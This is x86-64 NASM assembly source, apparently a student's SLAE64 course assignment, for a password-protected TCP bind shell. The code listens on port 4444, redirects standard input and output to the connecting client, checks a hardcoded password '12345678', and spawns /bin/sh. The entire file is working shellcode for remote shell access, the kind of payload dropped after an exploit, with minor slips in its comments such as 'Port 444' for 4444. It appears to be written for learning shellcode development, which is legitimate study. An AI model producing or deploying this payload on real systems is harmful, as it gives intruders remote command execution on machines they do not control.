; Author: Guillem Alminyana
; Student ID: PA-14628
; SLAE64 Assignment #1: Shell_Bind_TCP
; =====================================
;
; Compile: 
;   nasm -f elf64 BindShell-Execve-Stack.nasm -o BindShell-Execve-Stack.o 

%%define AF_INET 2
%define SOCK_STREAM 1
%define INADDR_ANY 0
%define PORT 0x5c11				; Port 444 (htons(4444))

global _start

section .text

_start:

	; socket_id = socket(AF_INET, SOCK_STREAM, 0)

	push 41
	pop rax

	push AF_INET
	pop rdi

	push SOCK_STREAM
	pop rsi

	xor rdx, rdx

	syscall

	; Save the socket_id value in RDI for future use
	push rax
	pop rdi

	; Prepare (struct sockaddr *)&server
	;	RSP will point to the struct address
	                                ; bzero(&server.sin_zero, 8)
	push rdx			; RDX Zero'ed 4 instructions up

	push rdx                        ; NULL can be placed as explained

	push word PORT
	push word AF_INET
	
	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	;	RDI already has the sock_id
	
	push 49                          ; Syscall number
	pop rax

	push rsp                         ; @ to (struct sockaddr * &server)
	pop rsi

	mov dl, 16                       ; length of the sockaddr struct

	syscall

	; listen(sock, MAX_CLIENTES
	;	RDI already has the sock_id
	
	push 50                           ; Syscall Number
	pop rax

	push 2
	pop rsi

	syscall

	; client_sock = accept(sock_id, (struct sockaddr *)&client, &sockaddr_len)
	; 	RDI already has the sock_id
	;   RSI and RDX gets NULL

	push 43                            ; Syscall Number
	pop rax
	
	xor rsi, rsi			   ; RSI <- NULL
	cdq				   ; RDX <- 0

	syscall

	; Store the client socket descripion returned by accept
	push rax
	pop rdi

	; CODE REMOVED - Close the parent socket_id

	; Sockets duplication
	push 2
	pop rsi
loop_1:					     ; RDI already has the client_sock id
	push 33
	pop rax
	
	syscall

	dec rsi
	jns loop_1                           ; Done stdin, stderr and stdout? No? Jump to bucle

	; Here starts the password stuff
password_check:

write_syscall:

        push 1                                ; Write Syscall
        pop rax

        ; rdi still keeps the sicket_id, we write() to the socket

        mov r9, "Passwd: "                    ;  Rel addressing to prompt      
        push r9
        mov rsi, rsp

        push 8                                ; Length "Passwd: " string
        pop rdx

        syscall

read_syscall:
        ; RDI keeps the socket_id value
	; RDX already has value 8 from before
	
        xor rax, rax                           ; Syscall number for read()
	
        ; rdi keeps the socket_id, we read() from it

        ; Where to store the input passwd
        add rsi, 8                             ; "Passwd: " string is replaced with the input

        syscall

compare_passwords:

        mov rax, "12345678"                     ; This is the password

        push rsi                                ; rsi points to PASSWD_INPUT
        pop rdi                                 ; scasq needs rdi 

        scasq                                   ; Compare RAX with [rdi] (1 byte)
        jne exit_program                        ; Passwords don't match, exit

	; execve SYSCALL
	; --------------
execve_syscall:

	; First NULL push
	xor rax, rax
	push rax

	; push /bin//sh in reverse
	mov rbx, 0x68732f2f6e69622f
	push rbx

	; store /bin//sh address in RDI
	push rsp
	pop rdi

	; Second NULL push
	push rax

	; set RDX
	push rsp
	pop rdx

	; Push address of /bin//sh
	push rdi

	; set RSI
	push rsp
	pop rsi

	; Call the Execve syscall
	push 59
	pop rax

	syscall
	
exit_program:

